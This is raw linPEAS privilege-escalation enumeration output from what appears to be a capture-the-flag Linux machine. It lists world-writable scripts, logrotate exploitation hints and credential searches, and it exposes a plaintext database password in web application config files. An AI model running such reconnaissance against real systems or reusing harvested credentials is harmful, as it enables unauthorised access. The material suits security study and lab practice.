-rw-r--r--   1 root root   96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root  833 Mar 26  2021 apps-bin-path.sh
-rw-r--r--   1 root root  729 Feb  2  2020 bash_completion.sh
-rw-r--r--   1 root root 1003 Aug 13  2019 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root  757 Nov  3  2019 gawk.sh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x   1 root root  873 May 11  2021 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root 3417 May 11  2021 Z99-cloud-locale-test.sh

[+] Hashes inside passwd file? ........... No
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 20)
/home
/home/plot_admin/.bash_history
/home/ubuntu/.bash_history

[+] Searching others files in folders owned by me

[+] Readable files belonging to root and readable by me but not world readable

[+] Modified interesting files in the last 5mins (limit 100)
/var/log/journal/39aa58630b094ce2b0c81e33880b0ef1/user-1001.journal
/var/log/journal/39aa58630b094ce2b0c81e33880b0ef1/system.journal
/var/log/syslog
/var/log/auth.log
/var/log/kern.log
/home/plot_admin/.gnupg/trustdb.gpg
/home/plot_admin/.gnupg/pubring.kbx

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory
#)You_can_write_more_log_files_inside_last_directory

[+] Files inside /home/plot_admin (limit 20)
total 36
drwxr-xr-x  5 plot_admin plot_admin 4096 Jul  6 20:37 .
drwxr-xr-x  4 root       root       4096 Oct 28  2021 ..
lrwxrwxrwx  1 root       root          9 Oct 28  2021 .bash_history -> /dev/null
-rw-r--r--  1 plot_admin plot_admin  220 Oct 28  2021 .bash_logout
-rw-r--r--  1 plot_admin plot_admin 3771 Oct 28  2021 .bashrc
drwx------  2 plot_admin plot_admin 4096 Jul  6 20:37 .gnupg
drwxrwxr-x  3 plot_admin plot_admin 4096 Oct 28  2021 .local
-rw-r--r--  1 plot_admin plot_admin  807 Oct 28  2021 .profile
drwxrwx--- 14 plot_admin plot_admin 4096 Oct 28  2021 tms_backup
-rw-rw----  1 plot_admin plot_admin   33 Oct 28  2021 user.txt

[+] Files inside others home (limit 20)
/home/ubuntu/.bashrc
/home/ubuntu/.bash_logout
/home/ubuntu/.sudo_as_admin_successful
/home/ubuntu/.profile

[+] Searching installed mail applications

[+] Mails (limit 50)
+] Backup files?
-rwxrwxrwx 1 www-data www-data 58 Jul  6 20:17 /var/www/scripts/backup.sh
-rw-r--r-- 1 root root 2743 Aug 24  2021 /etc/apt/sources.list.curtin.old

[+] Searching tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)

 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)

 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)


[+] Web files?(output limit)
/var/www/:
total 16K
drwxr-xr-x  4 root     root     4.0K Oct 28  2021 .
drwxr-xr-x 14 root     root     4.0K Oct 28  2021 ..
drwxr-xr-x  4 root     root     4.0K Oct 28  2021 html
drwxr-xr-x  2 www-data www-data 4.0K Jul  6 20:18 scripts

/var/www/html:
total 28K
drwxr-xr-x 4 root     root     4.0K Oct 28  2021 .

[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 2319 Feb 25  2020 /etc/bash.bashrc
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
lrwxrwxrwx 1 root root 46 Aug 24  2021 /etc/systemd/user/sockets.target.wants/pk-debconf-helper.socket -> /usr/lib/systemd/user/pk-debconf-helper.socket
lrwxrwxrwx 1 root root 9 Oct 28  2021 /home/plot_admin/.bash_history -> /dev/null
Searching possible passwords inside /home/plot_admin/.bash_history (limit 100)

-rw-r--r-- 1 plot_admin plot_admin 3771 Oct 28  2021 /home/plot_admin/.bashrc
-rw-r--r-- 1 plot_admin plot_admin 807 Oct 28  2021 /home/plot_admin/.profile
lrwxrwxrwx 1 root root 9 Oct 28  2021 /home/ubuntu/.bash_history -> /dev/null
Searching possible passwords inside /home/ubuntu/.bash_history (limit 100)

-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 /home/ubuntu/.bashrc
-rw-r--r-- 1 ubuntu ubuntu 807 Feb 25  2020 /home/ubuntu/.profile
-rw-r--r-- 1 ubuntu ubuntu 0 Oct 28  2021 /home/ubuntu/.sudo_as_admin_successful
drwxr-xr-x 2 root root 4096 Aug 24  2021 /usr/config
-rw-r--r-- 1 root root 3106 Aug 14  2019 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 2978 Feb 17  2020 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 2778 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 802 Sep 15  2018 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 www-data www-data 183 Oct 28  2021 /var/www/html/445/management/admin/.htaccess
-rw-r--r-- 1 www-data www-data 213 Oct 28  2021 /var/www/html/445/management/build/npm/.eslintrc.json
-rw-r--r-- 1 www-data www-data 213 Oct 28  2021 /var/www/html/445/management/build/config/.eslintrc.json
-rw-r--r-- 1 www-data www-data 866 Oct 28  2021 /var/www/html/445/management/dist/js/.eslintrc.json
-rw-r--r-- 1 www-data www-data 16 Oct 28  2021 /var/www/html/445/management/libs/.htaccess
-rw-r--r-- 1 www-data www-data 1404 Oct 28  2021 /var/www/html/445/management/libs/phpqrcode/.png-errors.txt
-rw-r--r-- 1 www-data www-data 225 Oct 28  2021 /var/www/html/445/management/.htaccess
-rw-r--r-- 1 landscape landscape 0 Aug 24  2021 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 plot_admin plot_admin 220 Oct 28  2021 /home/plot_admin/.bash_logout
-rwxrwx--- 1 plot_admin plot_admin 183 Oct 28  2021 /home/plot_admin/tms_backup/admin/.htaccess
-rwxrwx--- 1 plot_admin plot_admin 213 Oct 28  2021 /home/plot_admin/tms_backup/build/npm/.eslintrc.json
-rwxrwx--- 1 plot_admin plot_admin 213 Oct 28  2021 /home/plot_admin/tms_backup/build/config/.eslintrc.json
-rwxrwx--- 1 plot_admin plot_admin 866 Oct 28  2021 /home/plot_admin/tms_backup/dist/js/.eslintrc.json
-rwxrwx--- 1 plot_admin plot_admin 16 Oct 28  2021 /home/plot_admin/tms_backup/libs/.htaccess
-rwxrwx--- 1 plot_admin plot_admin 1404 Oct 28  2021 /home/plot_admin/tms_backup/libs/phpqrcode/.png-errors.txt
-rwxrwx--- 1 plot_admin plot_admin 225 Oct 28  2021 /home/plot_admin/tms_backup/.htaccess
-rwxrwx--- 1 plot_admin plot_admin 183 Oct 28  2021 /home/plot_admin/tms_backup/management/admin/.htaccess
-rwxrwx--- 1 plot_admin plot_admin 213 Oct 28  2021 /home/plot_admin/tms_backup/management/build/npm/.eslintrc.json
-rwxrwx--- 1 plot_admin plot_admin 213 Oct 28  2021 /home/plot_admin/tms_backup/management/build/config/.eslintrc.json
-rwxrwx--- 1 plot_admin plot_admin 866 Oct 28  2021 /home/plot_admin/tms_backup/management/dist/js/.eslintrc.json
-rwxrwx--- 1 plot_admin plot_admin 16 Oct 28  2021 /home/plot_admin/tms_backup/management/libs/.htaccess
-rwxrwx--- 1 plot_admin plot_admin 1404 Oct 28  2021 /home/plot_admin/tms_backup/management/libs/phpqrcode/.png-errors.txt
-rwxrwx--- 1 plot_admin plot_admin 225 Oct 28  2021 /home/plot_admin/tms_backup/management/.htaccess
-rw-r--r-- 1 ubuntu ubuntu 220 Feb 25  2020 /home/ubuntu/.bash_logout
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw------- 1 root root 0 Aug 24  2021 /etc/.pwd.lock
-rw------- 1 root root 0 Dec 15  2021 /snap/core18/2284/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /snap/core18/2284/etc/skel/.bash_logout
-rw------- 1 root root 0 Oct 15  2021 /snap/core18/2246/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /snap/core18/2246/etc/skel/.bash_logout
-rw------- 1 root root 0 Jan 14  2022 /snap/core20/1328/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1328/etc/skel/.bash_logout
-rw------- 1 root root 0 Sep 28  2021 /snap/core20/1169/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1169/etc/skel/.bash_logout
-rw-r--r-- 1 root root 4941 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.recordmcount.cmd
-rw-r--r-- 1 root root 1655 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.bin2c.cmd
-rw-r--r-- 1 root root 6884 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/mod/.devicetable-offsets.s.cmd
-rw-r--r-- 1 root root 3430 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/mod/.empty.o.cmd
-rw-r--r-- 1 root root 3889 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/mod/.mk_elfconfig.cmd
-rw-r--r-- 1 root root 6428 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/mod/.sumversion.o.cmd
-rw-r--r-- 1 root root 5084 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/mod/.file2alias.o.cmd
-rw-r--r-- 1 root root 131 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/mod/.modpost.cmd
-rw-r--r-- 1 root root 104 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/mod/.elfconfig.h.cmd
-rw-r--r-- 1 root root 6952 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/mod/.modpost.o.cmd
-rw-r--r-- 1 root root 6805 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/selinux/mdp/.mdp.cmd
-rw-r--r-- 1 root root 5973 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/selinux/genheaders/.genheaders.cmd
-rw-r--r-- 1 root root 6628 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.insert-sys-cert.cmd
-rw-r--r-- 1 root root 3686 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 5242 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 4732 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 155 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/genksyms/.genksyms.cmd
-rw-r--r-- 1 root root 4770 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/genksyms/.lex.lex.o.cmd
-rw-r--r-- 1 root root 126 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/genksyms/.lex.lex.c.cmd
-rw-r--r-- 1 root root 216 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/genksyms/.parse.tab.c.cmd
-rw-r--r-- 1 root root 4225 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/genksyms/.genksyms.o.cmd
-rw-r--r-- 1 root root 3756 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/genksyms/.parse.tab.o.cmd
-rw-r--r-- 1 root root 8168 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.sign-file.cmd
-rw-r--r-- 1 root root 4409 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/basic/.fixdep.cmd
-rw-r--r-- 1 root root 6749 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.extract-cert.cmd
-rw-r--r-- 1 root root 4987 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.lexer.lex.o.cmd
-rw-r--r-- 1 root root 4233 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.expr.o.cmd
-rw-r--r-- 1 root root 4147 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.symbol.o.cmd
-rw-r--r-- 1 root root 176 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.parser.tab.h.cmd
-rw-r--r-- 1 root root 245 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.conf.cmd
-rw-r--r-- 1 root root 4065 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.preprocess.o.cmd
-rw-r--r-- 1 root root 129 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.lexer.lex.c.cmd
-rw-r--r-- 1 root root 5349 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.conf.o.cmd
-rw-r--r-- 1 root root 5738 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.confdata.o.cmd
-rw-r--r-- 1 root root 4227 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/kconfig/.parser.tab.o.cmd
-rw-r--r-- 1 root root 3950 Jan 12  2022 /usr/src/linux-headers-5.4.0-96-generic/scripts/.kallsyms.cmd
grep: write error: Broken pipe

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
-rw-r--r-- 1 root root 4141 Oct 28  2021 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 4136 Oct 28  2021 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 3919 Oct 28  2021 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 37616 Jan 27  2022 /var/backups/apt.extended_states.0

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/dev/shm/linpeas.sh
/home/plot_admin
/run/lock
/run/screen
/run/screen/S-plot_admin
/snap/core18/2246/tmp
/snap/core18/2246/var/tmp
/snap/core18/2284/tmp
/snap/core18/2284/var/tmp
/snap/core20/1169/run/lock
/snap/core20/1169/tmp
/snap/core20/1169/var/tmp
/snap/core20/1328/run/lock
/snap/core20/1328/tmp
/snap/core20/1328/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1001
/tmp/.X11-unix
/tmp/.XIM-unix
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/scripts/backup.sh

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group plot_admin:
/dev/mqueue/linpeas.txt
/dev/shm/linpeas.sh

[+] Searching passwords in config PHP files

[+] Finding IPs inside logs (limit 70)
      9 /var/log/installer/subiquity-server-debug.log.2391:10.20.1.204
      9 /var/log/installer/subiquity-server-debug.log:10.20.1.204
      9 /var/log/bootstrap.log:1.3.4.202
      3 /var/log/wtmp:10.20.1.96
      3 /var/log/installer/subiquity-server-debug.log.2391:10.20.1.255
      3 /var/log/installer/subiquity-server-debug.log.2391:10.20.1.1
      3 /var/log/installer/subiquity-server-debug.log:10.20.1.255
      3 /var/log/installer/subiquity-server-debug.log:10.20.1.1
      2 /var/log/wtmp:10.20.1.36
      2 /var/log/installer/installer-journal.txt:10.20.1.204
      2 /var/log/installer/installer-journal.txt:10.20.1.1
      1 /var/log/wtmp:10.20.1.103
      1 /var/log/lastlog:10.20.1.36
      1 /var/log/installer/subiquity-server-debug.log.2391:127.255.255.255
      1 /var/log/installer/subiquity-server-debug.log:127.255.255.255
      1 /var/log/installer/installer-journal.txt:91.189.89.198

[+] Finding passwords inside logs (limit 70)
Binary file /var/log/journal/39aa58630b094ce2b0c81e33880b0ef1/user-1001.journal matches
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.47_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.8.1-1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.47) ...
/var/log/bootstrap.log:Setting up passwd (1:4.8.1-1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.47) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.47) over (3.5.47) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.8.1-1ubuntu5) ...
/var/log/cloud-init.log:2021-10-25 02:08:17,970 - ssh_util.py[DEBUG]: line 124: option PasswordAuthentication added with yes
/var/log/cloud-init.log:2021-10-25 02:08:17,997 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
/var/log/cloud-init.log:2021-10-28 06:55:46,274 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2022-01-27 10:50:00,408 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2022-01-27 11:09:29,522 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2022-01-28 02:02:59,568 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2022-01-28 02:37:28,759 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2025-07-06 17:27:40,147 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/dmesg.0:[   13.687757] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/dmesg:[   14.227107] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/installer/installer-journal.txt:Oct 25 02:05:29 ubuntu-server chage[5144]: changed password expiry for usbmux
/var/log/installer/installer-journal.txt:Oct 25 02:05:29 ubuntu-server usermod[5137]: change user 'usbmux' password
/var/log/installer/installer-journal.txt:Oct 25 02:05:57 ubuntu-server chage[16685]: changed password expiry for sshd
/var/log/installer/installer-journal.txt:Oct 25 02:05:57 ubuntu-server usermod[16678]: change user 'sshd' password
/var/log/installer/installer-journal.txt:Oct 25 15:03:13 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
/var/log/installer/installer-journal.txt:Oct 25 15:03:13 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/installer/installer-journal.txt:Oct 25 15:03:27 ubuntu-server chpasswd[2515]: pam_unix(chpasswd:chauthtok): password changed for installer
/var/log/installer/subiquity-server-debug.log:2021-10-25 15:03:27,667 DEBUG subiquitycore.utils:48 run_command called: chpasswd
/var/log/installer/subiquity-server-debug.log:2021-10-25 15:03:27,682 DEBUG subiquitycore.utils:61 run_command chpasswd exited with code 0
/var/log/installer/subiquity-server-debug.log.2391:2021-10-25 15:03:27,667 DEBUG subiquitycore.utils:48 run_command called: chpasswd
/var/log/installer/subiquity-server-debug.log.2391:2021-10-25 15:03:27,682 DEBUG subiquitycore.utils:61 run_command chpasswd exited with code 0

[+] Finding emails inside logs (limit 70)
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com
      1 /var/log/installer/installer-journal.txt:giometti@linux.it
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com
      1 /var/log/dmesg:giometti@linux.it
      1 /var/log/dmesg:dm-devel@redhat.com
      1 /var/log/dmesg.0:giometti@linux.it
      1 /var/log/dmesg.0:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
[+] Finding emails inside logs (limit 70)
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com
      1 /var/log/installer/installer-journal.txt:giometti@linux.it
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com
      1 /var/log/dmesg:giometti@linux.it
      1 /var/log/dmesg:dm-devel@redhat.com
      1 /var/log/dmesg.0:giometti@linux.it
      1 /var/log/dmesg.0:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/amazon/ssm/README.md:docker run -it --rm --name ssm-agent-build-container -v `pwd`:/amazon-ssm-agent ssm-agent-build-image make build-release
/etc/cloud/cloud.cfg:     lock_passwd: True
/etc/cloud/cloud.cfg:     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
/etc/nsswitch.conf:passwd:         files systemd
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min		= 4
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
/home/plot_admin/tms_backup/admin/login.php:          <input type="password" class="form-control" name="password" placeholder="Password">
/home/plot_admin/tms_backup/classes/DBConnection.php:    private $password = DB_PASSWORD;
/home/plot_admin/tms_backup/classes/Users.php:			$data .= " `password` = '{$password}' ";
/home/plot_admin/tms_backup/classes/Users.php:			$data .= ", `password` = '".md5($password)."' ";
/home/plot_admin/tms_backup/classes/Users.php:			$password = md5($password);
/home/plot_admin/tms_backup/initialize.php:if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
/home/plot_admin/tms_backup/initialize.php:if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
/home/plot_admin/tms_backup/management/admin/login.php:          <input type="password" class="form-control" name="password" placeholder="Password">
/home/plot_admin/tms_backup/management/classes/DBConnection.php:    private $password = DB_PASSWORD;
/home/plot_admin/tms_backup/management/classes/Users.php:			$data .= " `password` = '{$password}' ";
/home/plot_admin/tms_backup/management/classes/Users.php:			$data .= ", `password` = '".md5($password)."' ";
/home/plot_admin/tms_backup/management/classes/Users.php:			$password = md5($password);
/home/plot_admin/tms_backup/management/initialize.php:if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
/home/plot_admin/tms_backup/management/initialize.php:if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
/home/plot_admin/tms_backup/management/plugins/jquery/jquery.js:		password: null,
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:		ownerPassword: docDefinition.ownerPassword,
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:  password: 0x2000,
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:  password = unescape(encodeURIComponent(saslprep(password)));
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:		userPassword: docDefinition.userPassword,
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:        userPasswordEntry = getUserPasswordR2(this.encryptionKey);
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:	     *     var key = CryptoJS.EvpKDF(password, salt, { keySize: 8 });
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:	     *     var key = CryptoJS.PBKDF2(password, salt, { keySize: 8 });
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:      var paddedUserPassword = processPasswordR2R3R4(options.userPassword);
/home/plot_admin/tms_backup/management/plugins/pdfmake/pdfmake.js:      var processedUserPassword = processPasswordR5(options.userPassword);
/home/plot_admin/tms_backup/plugins/jquery/jquery.js:for ( i in { radio: true, checkbox: true, file: true, password: true, image: true } ) {
/home/plot_admin/tms_backup/plugins/jquery/jquery.js:		password: null,
/home/plot_admin/tms_backup/plugins/jquery/jquery.slim.js:for ( i in { radio: true, checkbox: true, file: true, password: true, image: true } ) {
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:		ownerPassword: docDefinition.ownerPassword,
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:  password: 0x2000,
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:  password = unescape(encodeURIComponent(saslprep(password)));
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:		userPassword: docDefinition.userPassword,
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:        userPasswordEntry = getUserPasswordR2(this.encryptionKey);
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:        userPasswordEntry = getUserPasswordR3R4(this.document._id, this.encryptionKey);
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:	     *     var key = CryptoJS.EvpKDF(password, salt, { keySize: 8 });
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:	     *     var key = CryptoJS.EvpKDF(password, salt, { keySize: 8, iterations: 1000 });
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:	     *     var key = CryptoJS.PBKDF2(password, salt, { keySize: 8 });
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:	     *     var key = CryptoJS.PBKDF2(password, salt, { keySize: 8, iterations: 1000 });
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:      var paddedUserPassword = processPasswordR2R3R4(options.userPassword);
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:  var password = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : '';
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:	    var PasswordBasedCipher = C_lib.PasswordBasedCipher = SerializableCipher.extend({
/home/plot_admin/tms_backup/plugins/pdfmake/pdfmake.js:      var processedUserPassword = processPasswordR5(options.userPassword);
/var/www/html/445/management/admin/login.php:          <input type="password" class="form-control" name="password" placeholder="Password">
/var/www/html/445/management/classes/DBConnection.php:    private $password = DB_PASSWORD;
/var/www/html/445/management/classes/Users.php:			$data .= " `password` = '{$password}' ";
/var/www/html/445/management/classes/Users.php:			$data .= ", `password` = '".md5($password)."' ";
/var/www/html/445/management/classes/Users.php:			$password = md5($password);
/var/www/html/445/management/initialize.php:if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
/var/www/html/445/management/initialize.php:if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
/var/www/html/445/management/plugins/jquery/jquery.js:for ( i in { radio: true, checkbox: true, file: true, password: true, image: true } ) {
/var/www/html/445/management/plugins/jquery/jquery.js:		password: null,
/var/www/html/445/management/plugins/jquery/jquery.slim.js:for ( i in { radio: true, checkbox: true, file: true, password: true, image: true } ) {
/var/www/html/445/management/plugins/pdfmake/pdfmake.js:		ownerPassword: docDefinition.ownerPassword,
/var/www/html/445/management/plugins/pdfmake/pdfmake.js:  password: 0x2000,
/var/www/html/445/management/plugins/pdfmake/pdfmake.js:  password = unescape(encodeURIComponent(saslprep(password)));
/var/www/html/445/management/plugins/pdfmake/pdfmake.js:		userPassword: docDefinition.userPassword,
/var/www/html/445/management/plugins/pdfmake/pdfmake.js:        userPasswordEntry = getUserPasswordR2(this.encryptionKey);
/var/www/html/445/management/plugins/pdfmake/pdfmake.js:        userPasswordEntry = getUserPasswordR3R4(this.document._id, this.encryptionKey);
/var/www/html/445/management/plugins/pdfmake/pdfmake.js:	     *     var key = CryptoJS.EvpKDF(password, salt, { keySize: 8 });

[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$1 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$2 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$3 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$4 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$5 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$6 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY$7 = '.data-api';
/home/plot_admin/tms_backup/management/plugins/bootstrap/js/bootstrap.bundle.js:  var DATA_API_KEY = '.data-api';
